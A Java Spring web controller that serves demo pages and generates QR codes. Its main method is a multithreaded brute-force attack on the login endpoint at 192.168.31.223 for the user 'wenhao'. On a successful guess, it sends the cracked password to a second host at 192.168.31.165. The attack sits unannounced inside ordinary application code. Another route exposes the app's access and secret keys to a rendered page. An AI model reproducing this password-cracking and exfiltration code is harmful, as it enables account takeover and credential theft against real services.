package com.supos.app.controller;

import cn.hutool.http.HttpRequest;
import cn.hutool.http.HttpResponse;
import com.google.zxing.BarcodeFormat;
import com.google.zxing.MultiFormatWriter;
import com.google.zxing.client.j2se.MatrixToImageConfig;
import com.google.zxing.client.j2se.MatrixToImageWriter;
import com.google.zxing.common.BitMatrix;
import com.supos.app.dto.sampleMailDto;
import org.apache.commons.codec.binary.Base64;
import org.springframework.http.HttpHeaders;
import org.springframework.http.HttpStatus;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.*;
import org.springframework.ui.Model;
import org.springframework.beans.factory.annotation.Value;

import javax.imageio.ImageIO;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.*;


@Controller
public class frontEnd {

    @Value("${app.path}")
    private String path;
    @Value("${app.ak}")
    private String ak;
    @Value("${app.sk}")
    private String sk;

    @RequestMapping("/multipleWindow3dScene")
    public String view(Model model) {
//        String pathNew = path + "apps/wenhao-javaw/css/example.css";
//        String pathNewPNG = path + "apps/wenhao-javaw/i12.png";
//        String pathExample1 = path + "apps/wenhao-javaw/css/example1.css";
//        model.addAttribute("pathNew", pathNew);
//        model.addAttribute("pathNewPNG", pathNewPNG);
//        model.addAttribute("pathExample1", pathExample1);
//        return "example.html";
        String pathNew = path + "apps/wenhao-javaw/js/three.r124.min.js";
        model.addAttribute("pathNew", pathNew);
        String pathNew1 = path + "apps/wenhao-javaw/js/main.js";
        model.addAttribute("pathNew1", pathNew1);
        return "index.html";
    }

    @RequestMapping("/frontend")
    public String view1(Model model) {
        String pathNew = path + "apps/wenhao-javaw/css/example.css";
        String pathNewPNG = path + "apps/wenhao-javaw/i12.png";
        String pathExample1 = path + "apps/wenhao-javaw/css/example1.css";
        model.addAttribute("pathNew", pathNew);
        model.addAttribute("pathNewPNG", pathNewPNG);
        model.addAttribute("pathExample1", pathExample1);
        return "example.html";
    }

    @RequestMapping("/fun")
    public String view2(Model model) {
        return "fun.html";
    }

    @RequestMapping("/survey")
    public String view8(Model model) {
        return "survey.html";
    }

    @RequestMapping("/spacex")
    public String view9(Model model) {
        return "spaceX.html";
    }

    @RequestMapping("/qrform")
    public String view10(Model model) {
        return "qrcodeGenerate.html";
    }

    @RequestMapping("/contactpage")
    public String view6(Model model, @RequestParam(value = "name", required = false) String name, @RequestParam(value = "email", required = false) String email) {
        String contactName = name;
        String contactEmail = email;
        model.addAttribute("contactName", contactName);
        model.addAttribute("contactEmail", contactEmail);
        return "contactPage.html";
    }

    @RequestMapping("/qrcodegenerate")
    public ResponseEntity<byte[]> view7(Model model, @RequestParam(value = "name", required = false) String name, @RequestParam(value = "email", required = false) String email) throws IOException {
        sampleMailDto mail = new sampleMailDto();
        mail.setMail(email);
        mail.setName(name);
        String text="http://47.236.10.165:8080/apps/wenhao-javaw/contactpage?name="+name+"&email="+email;
        byte[] imageBytes = null;
        try {
            int width = 300; // 二维码图片的宽度
            int height = 300; // 二维码图片的高度

            MultiFormatWriter multiFormatWriter = new MultiFormatWriter();
            BitMatrix bitMatrix = multiFormatWriter.encode(text, BarcodeFormat.QR_CODE, width, height);

            // 创建BufferedImage对象并设置二维码颜色
            BufferedImage qrImage = MatrixToImageWriter.toBufferedImage(bitMatrix, new MatrixToImageConfig(0xFF000000, 0xFFFFFFFF));

            // 将BufferedImage对象转换为字节数据
            ByteArrayOutputStream os = new ByteArrayOutputStream();
            ImageIO.write(qrImage, "png", os);
            imageBytes = os.toByteArray();
        } catch (Exception e) {
            e.printStackTrace();
            return new ResponseEntity<>(HttpStatus.INTERNAL_SERVER_ERROR);
        }

        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(MediaType.IMAGE_PNG);

        return new ResponseEntity<>(imageBytes, headers, HttpStatus.OK);
    }

    @RequestMapping("/package")
    public String view3(Model model) {
        return "note.html";
    }

    @RequestMapping("/suposapi")
    public String view4(Model model) {
        model.addAttribute("ak", ak);
        model.addAttribute("sk", sk);
        return "suposOpenApiCall.html";
    }

    @RequestMapping("/packageCharts")
    public String view5() {
        return "noteUsage.html";
    }

    public static void main(String[] args) throws InterruptedException, ExecutionException {
        int maxLength = 9;
        int numThreads = Runtime.getRuntime().availableProcessors(); // 使用可用的处理器数量

        ExecutorService executorService = Executors.newFixedThreadPool(numThreads);

        for (int length = 8; length <= maxLength; length++) {
            generateCombinationsConcurrently(length, executorService);
        }

        executorService.shutdown();
    }

    private static void generateCombinationsConcurrently(int length, ExecutorService executorService)
            throws InterruptedException, ExecutionException {
        String characters = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()-_=+[]{}|;:'\\\",.<>?/";
        List<Future<Void>> futures = new ArrayList<>();

        for (int i = 0; i < characters.length(); i++) {
            char currentChar = characters.charAt(i);
            String prefix = String.valueOf(currentChar);
            Callable<Void> task = () -> {
                System.out.println("Generating combinations for prefix: " + prefix);
                generateCombinations(prefix, characters, length - 1);
                return null;
            };
            futures.add(executorService.submit(task));
        }

        for (Future<Void> future : futures) {
            future.get(); // 等待任务完成
        }
    }

        private static void generateCombinations(String prefix, String characters, int remainingLength) {
            if (remainingLength == 0) {
                System.out.println(prefix);
//                prefix="b00000U!";
                String body ="{\"userName\":\"wenhao\",\"password\":\""+prefix+"\",\"clientId\":\"ms-content-sample\",\"userAgent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0\"}";
                HttpResponse response = HttpRequest.post("http://192.168.31.223:8080/inter-api/auth/login").body(body).execute();
                if (response.getStatus() == 200){
                     HttpRequest.get("http://192.168.31.165:1880/hello?hello="+prefix).execute();
                    System.out.println("成功");
                }
                return;
            }

            for (int i = 0; i < characters.length(); i++) {
                char currentChar = characters.charAt(i);
                generateCombinations(prefix + currentChar, characters, remainingLength - 1);
            }
        }


}
